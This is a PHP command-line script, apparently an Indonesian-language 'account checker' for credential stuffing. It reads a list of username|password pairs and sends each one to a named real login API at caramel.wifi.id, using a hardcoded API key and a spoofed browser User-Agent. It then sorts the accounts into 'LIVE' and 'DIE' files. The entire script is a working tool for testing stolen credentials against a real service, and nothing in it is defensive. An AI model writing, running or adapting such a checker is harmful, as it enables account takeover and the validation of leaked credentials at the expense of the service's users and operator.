<?php
error_reporting(0);
// Color
$blue="\033[1;34m";
$cyan="\033[1;36m";
$okegreen="\033[92m";
$lightgreen="\033[1;32m";
$white="\033[1;37m";
$purple="\033[1;35m";
$red="\033[1;31m";
$yellow="\033[1;33m";
 
$list = "list.txt";
echo "$yellow ??$white List Akun : ";
$filenya = trim(fgets(STDIN));
 
$file = file($filenya);
echo "$yellow **$white Checking list ... \n\n";
foreach ($file as $akon => $data) {
    $split = explode("|", $data);
    $user = trim($split[0]);
    $pass = trim($split[1]);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://caramel.wifi.id/api/ott/v2');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"password\":\"$pass\",\"username\":\"$user\"}");
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
    $headers = array();
    $headers[] = 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0';
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
    $headers[] = 'Accept-Language: en-US,en;q=0.5';
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    $headers[] = 'X-Api-Key: 8d446f02-ef8d-47b2-9663-dbe75b016fb9';
    $headers[] = 'Connection: keep-alive';
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    $headers[] = 'Cache-Control: max-age=0, no-cache';
    $headers[] = 'Pragma: no-cache';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $result = curl_exec($ch);
    echo $result;
    curl_close($ch);
    $json = json_decode($result);
    $act = $json->act;
    if ($act == "INVALID") {
        echo "$red //$white DIE!$yellow ->$white $user|$pass \n";
        fwrite(fopen("die.txt", "a"), "$user|$pass \n");
    }else{
        echo "$okegreen //$white LIVE$yellow ->$white $user|$pass \n";
        fwrite(fopen("live.txt", "a"), "$user|$pass \n");
    }
    sleep(1);
}
echo "\n";
 
?>
